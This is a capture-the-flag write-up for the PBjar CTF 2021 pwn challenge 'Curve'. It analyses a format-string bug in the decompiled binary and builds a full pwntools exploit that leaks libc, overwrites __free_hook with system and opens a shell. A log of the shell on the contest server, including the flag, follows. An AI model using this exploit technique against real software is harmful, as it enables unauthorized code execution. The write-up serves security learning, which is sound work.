## Curve

> Points: 398
>
> Solves: 28

### Description:
One of the hardest parts of making a contest is making sure that it has a good curve aka a good problem difficulty distribution. This lazily made problem was made to make the beginning pwn curve a little less steep. 

Connect with "nc 143.198.127.103 42004".

Author: Rythm

### Attachments:
```
curve.zip
```

## Analysis:

This binary can be input 3 times, the first time(`Input 1`) it is output with `puts`, the second time(`Input 2`) there is no output, and the third time(`Input 3`) it is output directly with `printf`. Therefore, there is a vulnerability of `FSB (Format String Bug)` in the third input.
However, since this binary is `Full RELRO`, `GOT` cannot be rewritten with `FSB`. The method of rewriting the return address with `FSB` does not have enough read input size.
Also, since the third input is written to the area allocated by `malloc` in the heap, the address that can be used by `FSB` cannot be specified.

Below is the compilation result of the main () function by `Ghidra`.
```c
undefined8 main(void)

{
  char *__format;
  long in_FS_OFFSET;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  __format = (char *)malloc(0x80);
  puts("Oh no! Evil Morty is attempting to open the central finite curve!");
  puts("You get three inputs to try to stop him.\n");
  puts("Input 1:");
  read(0,local_98,0xb0);
  puts(local_98);
  puts("Input 2:");
  read(0,local_98,0x80);
  puts("\nInput 3:");
  read(0,__format,0x80);
  printf(__format);　　　　　　　　　<=========== There is a `FSB` vulnerability here
  free(__format);
  puts("\nLol how could inputting strings stop the central finite curve.");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The result of checksec. We can see that it is `Full RELRO`.
```bash
$ checksec curve
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Since the character string input in `Input 2` is output as `0x4141414141414141` at the 8th position of `Input 3`, We can see that the value of `index` is `8`.
```bash
Input 2:
AAAAAAAA

Input 3:
BBBBBBBB,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
BBBBBBBB,0x55555555a2a0,0x80,0x7ffff7ef5e8e,0xa,0x7ffff7fc5be0,(nil),0x55555555a2a0,0x4141414141414141,0xa,(nil),(nil),(nil),(nil),(nil)

```

## Solution:

First, the libc address leak can be done by entering a `0x98` size string in `Input 1` to leak the address `__libc_start_main + 234`. We can calculate the base address of libc.

```bash
gdb-peda$ x/80gx 0x7fffffffdec0
0x7fffffffdec0:	0x0000000000000000	0x000055555555a2a0
0x7fffffffded0:	0x4141414141414141	0x4141414141414141
0x7fffffffdee0:	0x4141414141414141	0x0000000000000a61
0x7fffffffdef0:	0x0000000000000000	0x0000000000000000
0x7fffffffdf00:	0x0000000000000000	0x0000000000000000
0x7fffffffdf10:	0x0000000000f0b5ff	0x00000000000000c2
0x7fffffffdf20:	0x00007fffffffdf47	0x0000555555555325
0x7fffffffdf30:	0x0000000000000000	0x0000000000000000
0x7fffffffdf40:	0x00005555555552e0	0x00005555555550b0
0x7fffffffdf50:	0x00007fffffffe050	0x6b35ac597c192200
0x7fffffffdf60:	0x00005555555552e0	0x00007ffff7e2dd0a  <=== Leak this `0x00007ffff7e2dd0a (__ libc_start_main + 234)`
0x7fffffffdf70:	0x00007fffffffe058	0x0000000100000000
```

I use `free(__format)` which is called at the end of the binary to start the shell('/bin/sh'). I use FSB to write the address of the `system` function in `__free_hook`.
At this time, first I write string of `'/bin/sh'` so that it is in the form of `free('/bin/sh; FSB string')`. Then, when I call free(), it will be in the form of `system(/bin/sh; ...')`, so I can start the shell('/bin/sh').

Also, `Input 2` writes the address of `__free_hook`, and `INPUT 3` writes the character string of `FSB`. Since the input size of `Input 2` and` Input 3` is as large as `0x80`, we can write the same character string created by `fmtstr_payload` to `Input 2` and` Input 3` as shown below.

```python
index = 8
writes = {free_hook: system_addr}
buf = b"/bin/sh;" + fmtstr_payload(index+1, writes, numbwritten=8, write_size='short')
```

`fmtstr_payload` creates a string like the one below.
```bash
    00000000  2f 62 69 6e  2f 73 68 3b  25 36 35 30  39 36 63 25  │/bin│/sh;│%650│96c%│
    00000010  31 34 24 6c  6c 6e 25 33  33 31 39 39  63 25 31 35  │14$l│ln%3│3199│c%15│
    00000020  24 68 6e 25  33 30 36 39  33 63 25 31  36 24 68 6e  │$hn%│3069│3c%1│6$hn│
    00000030  70 8e fc f7  ff 7f 00 00  74 8e fc f7  ff 7f 00 00  │p···│····│t···│····│
    00000040  72 8e fc f7  ff 7f 00 00  0a                        │r···│····│·│
```

## Exploit code:
```python
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './curve'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42004
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.31.so")
else:
  s = process(BINARY)
  libc = elf.libc
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  #libc = ELF("./libc-2.31.so")

# libc leak
s.sendlineafter("Input 1:\n", "A"*0x98)
s.recvuntil("A"*0x98)
libc_leak = u64(s.recvuntil("\nI")[:-2] + b"\x00\x00")
libc_base = libc_leak - libc.sym.__libc_start_main - 234
free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

index = 8

# Write system address in __free_hook to call system('/bin/sh')
writes = {free_hook: system_addr}
buf = b"/bin/sh;" + fmtstr_payload(index+1, writes, numbwritten=8, write_size='short')

s.sendlineafter("2:\n", buf)
s.sendlineafter("3:\n", buf)

s.interactive()
```

## Results:
```bash
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_Curve/curve$ python3 solve_fmtstr.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/curve'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42004: Done
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_Curve/curve/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f2d588ced0a
libc_base = 0x7f2d588a8000
[*] Switching to interactive mode
/bin/sh;
...
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 2028
lrwxrwxrwx   1 root root       7 Aug 27 07:16 bin -> usr/bin
drwxr-xr-x   2 root root    4096 Apr 15  2020 boot
drwxr-xr-x   5 root root     340 Sep 17 04:48 dev
drwxr-xr-x   1 root root    4096 Sep 17 04:48 etc
-rwxr-xr-x   1 root root      64 Sep 17 04:28 flag.txt
drwxr-xr-x   1 root root    4096 Sep 17 04:47 home
-rwxr-xr-x   1 root root  177928 Sep 17 04:28 ld-2.31.so
lrwxrwxrwx   1 root root       7 Aug 27 07:16 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib32 -> usr/lib32
lrwxrwxrwx   1 root root       9 Aug 27 07:16 lib64 -> usr/lib64
-rwxr-xr-x   1 root root 1839792 Sep 17 04:28 libc-2.31.so
lrwxrwxrwx   1 root root      10 Aug 27 07:16 libx32 -> usr/libx32
drwxr-xr-x   2 root root    4096 Aug 27 07:16 media
drwxr-xr-x   2 root root    4096 Aug 27 07:16 mnt
drwxr-xr-x   2 root root    4096 Aug 27 07:16 opt
dr-xr-xr-x 262 root root       0 Sep 17 04:48 proc
drwx------   2 root root    4096 Aug 27 07:27 root
drwxr-xr-x   5 root root    4096 Aug 27 07:27 run
lrwxrwxrwx   1 root root       8 Aug 27 07:16 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Aug 27 07:16 srv
dr-xr-xr-x  13 root root       0 Sep 17 04:48 sys
drwxrwxrwt   1 root root    4096 Sep 17 04:38 tmp
drwxr-xr-x   1 root root    4096 Aug 27 07:16 usr
drwxr-xr-x   1 root root    4096 Aug 27 07:27 var
$ cat flag.txt
flag{n0w_y0ur3_3v1l_m0rty_t00_s00n3r_0r_l4t3r_w3_4ll_4r3_s4dg3}
```

## Reference:

https://inaz2.hatenablog.com/entry/2014/04/20/041453
